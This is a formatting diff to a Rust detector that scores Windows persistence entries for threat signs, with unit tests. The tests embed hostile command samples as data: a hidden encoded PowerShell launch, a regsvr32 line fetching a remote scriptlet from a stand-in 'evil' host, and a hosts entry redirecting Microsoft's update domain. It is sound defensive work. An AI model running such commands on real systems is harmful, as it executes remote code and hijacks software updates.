@@ -81,7 +81,10 @@ pub fn analyze_entry(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
 
     // Executable in a temp directory.
     if is_temp(&path_lower)
-        && ext.as_deref().map(|e| EXECUTABLE_EXTS.contains(&e)).unwrap_or(false)
+        && ext
+            .as_deref()
+            .map(|e| EXECUTABLE_EXTS.contains(&e))
+            .unwrap_or(false)
     {
         ev.push(ThreatEvidence::SuspiciousLocation {
             path: path.clone(),
@@ -104,7 +107,10 @@ pub fn analyze_entry(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
 
     // Unsigned executable.
     if entry.signed == Some(false)
-        && ext.as_deref().map(|e| EXECUTABLE_EXTS.contains(&e)).unwrap_or(false)
+        && ext
+            .as_deref()
+            .map(|e| EXECUTABLE_EXTS.contains(&e))
+            .unwrap_or(false)
     {
         ev.push(ThreatEvidence::SuspiciousLocation {
             path: path.clone(),
@@ -117,7 +123,9 @@ pub fn analyze_entry(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
         ev.push(ThreatEvidence::PowerShellIndicator { indicator });
     }
     if cmd_lower.contains("-enc") || cmd_lower.contains("-encodedcommand") {
-        ev.push(ThreatEvidence::PowerShellIndicator { indicator: "encodedcommand".into() });
+        ev.push(ThreatEvidence::PowerShellIndicator {
+            indicator: "encodedcommand".into(),
+        });
     }
 
     // LOLBin / suspicious command line.
@@ -137,9 +145,15 @@ pub fn analyze_entry(entry: &PersistenceEntry) -> Vec<ThreatEvidence> {
     if entry.kind == PersistenceKind::BrowserExtension {
         let d = entry.detail.to_ascii_lowercase();
         if entry.signed == Some(false)
-            || ["unpacked", "sideload", "development", "external", "registry"]
-                .iter()
-                .any(|m| d.contains(m))
+            || [
+                "unpacked",
+                "sideload",
+                "development",
+                "external",
+                "registry",
+            ]
+            .iter()
+            .any(|m| d.contains(m))
         {
             ev.push(ThreatEvidence::SuspiciousLocation {
                 path: entry.location.clone(),
@@ -197,15 +211,25 @@ mod tests {
 
     #[test]
     fn temp_executable_flagged() {
-        let e = entry(PersistenceKind::RegistryRunKey, "C:\\Users\\a\\AppData\\Local\\Temp\\x.exe");
+        let e = entry(
+            PersistenceKind::RegistryRunKey,
+            "C:\\Users\\a\\AppData\\Local\\Temp\\x.exe",
+        );
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::PersistenceMechanism { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::PersistenceMechanism { .. })));
     }
 
     #[test]
     fn benign_run_key_not_reported() {
-        let e = entry(PersistenceKind::RegistryRunKey, "\"C:\\Program Files\\App\\app.exe\" --tray");
+        let e = entry(
+            PersistenceKind::RegistryRunKey,
+            "\"C:\\Program Files\\App\\app.exe\" --tray",
+        );
         assert!(analyze_entry(&e).is_empty());
     }
 
@@ -216,7 +240,9 @@ mod tests {
             "powershell.exe -nop -w hidden -enc SQBFAFgA",
         );
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::PowerShellIndicator { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::PowerShellIndicator { .. })));
     }
 
     #[test]
@@ -224,7 +250,9 @@ mod tests {
         let mut e = entry(PersistenceKind::StartupEntry, "C:\\Startup\\evil.vbs");
         e.location = "Startup".into();
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousExtension { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::SuspiciousExtension { .. })));
     }
 
     #[test]
@@ -234,7 +262,9 @@ mod tests {
             "regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll",
         );
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
     }
 
     #[test]
@@ -247,14 +277,23 @@ mod tests {
         );
         e.detail = "10.0.0.5 www.update.microsoft.com".into();
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
     }
 
     #[test]
     fn unsigned_binary_flagged() {
-        let e = PersistenceEntry::new(PersistenceKind::ServicePersistence, "svc", "C:\\x\\bad.exe", "services")
-            .with_signed(Some(false));
+        let e = PersistenceEntry::new(
+            PersistenceKind::ServicePersistence,
+            "svc",
+            "C:\\x\\bad.exe",
+            "services",
+        )
+        .with_signed(Some(false));
         let ev = analyze_entry(&e);
-        assert!(ev.iter().any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
+        assert!(ev
+            .iter()
+            .any(|x| matches!(x, ThreatEvidence::SuspiciousLocation { .. })));
     }
 }
